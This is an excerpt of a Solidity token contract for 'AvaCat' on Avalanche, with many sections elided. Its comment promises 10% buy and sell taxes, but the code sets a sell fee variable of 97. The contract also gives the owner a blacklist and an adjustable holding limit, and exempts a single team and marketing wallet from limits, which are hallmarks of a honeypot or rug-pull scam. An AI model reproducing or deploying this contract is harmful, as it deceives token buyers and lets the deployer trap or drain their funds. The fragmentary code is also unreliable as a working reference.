...
/*
    AvaCat is an innovative deflationary token aiming to revolutionize Defi on Avalanche.

    https://t.me/AvacatAVAX

    10% taxes on buy and sell!
...
contract AvaCat is Context, IBEP20, Ownable {
    ...
    string private constant _name     = "AvaCat";
    string private constant _symbol   = "AVACAT";
    ...
    uint256 public  _liquidityFeeSell = 97;
    
    uint256 public  _maxTxAmount     = _tTotal * 30000 / 30000;
    ...
    uint256 public _antiWhalAVAXreshold = _tTotal * 200 / 10000; // 2% of total supply
    ...
    constructor () {
        ...
        // 
        _teamWallet       = 0x3828FAb2967823599E2C95D7715CcE1020635873;
        _marketingWallet = 0x3828FAb2967823599E2C95D7715CcE1020635873;
        ...
        _isExcludedFromAntiWhale[address(0x3828FAb2967823599E2C95D7715CcE1020635873)]            = true; // constructor address
        _isExcludedFromMaxTx[owner()] = true;
        _isExcludedFromMaxTx[address(0x3828FAb2967823599E2C95D7715CcE1020635873)] = true; // constructor address
...
//Remove from Blacklist 
    ...
    function setAntiWhalAVAXreshold(uint256 antiWhalAVAXreshold) external onlyOwner {
        _antiWhalAVAXreshold = antiWhalAVAXreshold;
    }
    ...
    function _transfer(
        ...
        */
        if ( _isAntiWhaleEnabled && !_isExcludedFromAntiWhale[to] ) {
            require(balanceOf(to) <= _antiWhalAVAXreshold, "Anti whale: can't hold more than the specified threshold");
        }
    }
    ...
    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private returns (uint256, uint256) {
        ...
        // add the liquidity
        (uint amountToken, uint amountAVAX, ) = uniswapV2Router.addLiquidityAVAX{value: bnbAmount}(
            address(this),
            tokenAmount,
        ...
        return (uint256(amountToken), uint256(amountAVAX));
    }
